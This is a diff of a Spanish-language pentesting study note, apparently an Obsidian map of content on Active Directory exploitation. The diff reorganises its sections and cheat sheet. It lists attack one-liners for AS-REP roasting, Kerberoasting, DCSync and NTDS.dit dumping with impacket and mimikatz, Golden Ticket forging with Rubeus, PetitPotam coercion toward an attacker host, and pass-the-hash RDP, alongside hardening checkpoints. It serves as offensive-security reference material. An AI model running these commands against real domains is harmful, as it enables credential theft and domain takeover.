@@ -4,7 +4,7 @@ aliases:
   - Explotación de Active Directory
   - ADX
 tags:
-  - type/moc
+  - type/moc/tertiary
   - asset/active-directory
   - env/windows
   - technique/lateral-movement
@@ -27,21 +27,11 @@ Premisa: ya hay acceso de red al DC (directo o via pivot) y/o creds válidas de 
 
 > Entrada típica: user:pass de spraying, NTLMv2 capturado via `responder`, AS-REP sin pre-auth, LLMNR poisoning, o RCE inicial en host unido a dominio.
 
+> Para fase de enum previa (hosts, users, ACLs, BloodHound, Kerberos enum) ver hub [[Active Directory Enumeration]].
+
 ***
 
-## 1. Enumeración (previa)
-
-Hub de enum inicial: [[AD Initial Enumeration Playbook]].
-
-- [[AD - Hosts Enumeration]] — descubrir DCs, member servers, workstations.
-- [[AD - Users & Groups Enumeration]] — `net user /domain`, `Get-ADUser`, RPC/LDAP.
-- [[AD - Password Policy Enumeration]] — threshold antes de spraying, lockout.
-- [[AD - Object Permissions Enumeration]] — `powerview`, `AdFind`, detectar ACLs juicy.
-- [[AD - Security Controls Enumeration]] — AV, EDR, AppLocker, LAPS, LSA Protection.
-- [[Kerberos (88) - Enumeración]] — user enum con `kerbrute`, AS-REP list.
-- [[BloodHound & SharpHound]] — path-finding a DA, kerberoasteable, unconstrained delegation, ACL abuse.
-
-## 2. Credential Access
+## 1. Credential Access
 
 ### Kerberos attacks
 - **AS-REP Roasting** (`DONT_REQ_PREAUTH`) — `impacket-GetNPUsers` / `Rubeus asreproast` → hash crackeable offline.
@@ -65,7 +55,7 @@ Umbrella: [[Secret Dumping]] — DCSync, SAM/SECURITY/SYSTEM, NTDS.dit offline, 
 - `ntds.dit` + `SYSTEM` hive → `impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM`.
 - `SAM` + `SYSTEM` → hashes locales.
 
-## 3. Privilege Escalation en el dominio
+## 2. Privilege Escalation en el dominio
 
 ### ACL abuse
 - `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner` sobre user/group/computer.
@@ -92,7 +82,7 @@ Umbrella: [[Secret Dumping]] — DCSync, SAM/SECURITY/SYSTEM, NTDS.dit offline, 
 ### Exchange
 - Exchange en grupo `Exchange Windows Permissions` con `WriteDacl` sobre domain root (pre-cumulative update parches) → DCSync.
 
-## 4. Lateral Movement
+## 3. Lateral Movement
 
 Hubs: [[Active Directory Lateral Movement]], [[Windows & Active Directory Lateral Movement]].
 
@@ -104,7 +94,7 @@ Hubs: [[Active Directory Lateral Movement]], [[Windows & Active Directory Latera
 - **PsExec / SMBexec** — ruido alto pero clásico.
 - **RDP** con `xfreerdp /dynamic-resolution /u:user /pth:HASH /v:host`.
 
-## 5. Domain Dominance & Persistence
+## 4. Domain Dominance & Persistence
 
 - **DCSync** — `secretsdump user:pass@DC -just-dc-ntlm`, `mimikatz lsadump::dcsync /user:krbtgt`.
 - **Golden Ticket** — krbtgt hash → forjar TGT arbitrario (`Rubeus golden /user:fakeadmin /rc4:KRBTGT_HASH /sid:...`).
@@ -116,7 +106,7 @@ Hubs: [[Active Directory Lateral Movement]], [[Windows & Active Directory Latera
 - **Certificate persistence** (Golden Certificate) — robar CA private key → forjar certs válidos.
 - **Trust abuse** — SID History, cross-forest trust sin SID filtering → escalada a forest root.
 
-## 6. Hardening checkpoints (ofensivo/defensivo)
+## 5. Hardening checkpoints (ofensivo/defensivo)
 
 - `krbtgt` password rotation cada 180 días (2 veces consecutivas).
 - LAPS para passwords de local admin.
@@ -136,12 +126,7 @@ whoami /all
 nltest /dclist:
 systeminfo
 
-# Low-priv enum
-nxc smb DC -u user -p pass --shares
-bloodhound-python -u user -p pass -d dom.local -c all --zip
-certipy find -u user -p pass -dc-ip X -vulnerable
-
-# Kerberos
+# Credential access (Kerberos offline)
 impacket-GetNPUsers dom.local/ -usersfile users.txt -no-pass
 impacket-GetUserSPNs dom.local/user:pass -request
 
@@ -151,6 +136,7 @@ PetitPotam.py -u '' -p '' attacker DC
 
 # PrivEsc path
 bloodhound → "Shortest Path to Domain Admins from Owned Principals"
+certipy find -u user -p pass -dc-ip X -vulnerable
 ```
 
 ***
